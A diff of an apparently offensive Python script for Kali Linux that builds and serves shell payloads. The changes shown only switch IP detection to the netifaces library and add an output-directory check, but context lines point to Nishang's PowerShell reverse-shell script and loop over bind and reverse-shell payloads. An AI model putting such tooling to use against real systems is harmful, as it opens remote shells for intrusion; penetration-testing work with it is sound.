@@ -7,9 +7,9 @@
 #   apt-get install winbind
 
 # On Kali:
-#   apt-get install python3-requests
+#   apt-get install python3-netifaces python3-requests
 # Or:
-#   pip install requests
+#   pip install netifaces requests
 
 import subprocess
 import os
@@ -17,9 +17,17 @@ import shutil
 import stat
 import requests
 from urllib.parse import urlparse
-import socket
+import netifaces
 
-SERVER = socket.gethostbyname(socket.gethostname())
+
+def get_ip_address():
+    def_gateway = netifaces.gateways()['default']
+    def_gateway_name = def_gateway[netifaces.AF_INET][1]
+    def_gateway_addr = netifaces.ifaddresses(def_gateway_name)
+    return def_gateway_addr[netifaces.AF_INET][0]['addr']
+
+
+SERVER = get_ip_address()
 WEBSERVER_PORT = 8000
 
 PS_REV_TCP_URL = "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1"
@@ -204,6 +212,9 @@ print("Detected IP {}".format(SERVER))
 execute_command('env')
 
 setup_wine()
+
+if not os.path.exists(OUTPUT_DIR):
+    os.makedirs(OUTPUT_DIR)
 
 for p in PAYLOADS:
     rhost = True if "bind" in p['payload'] else False
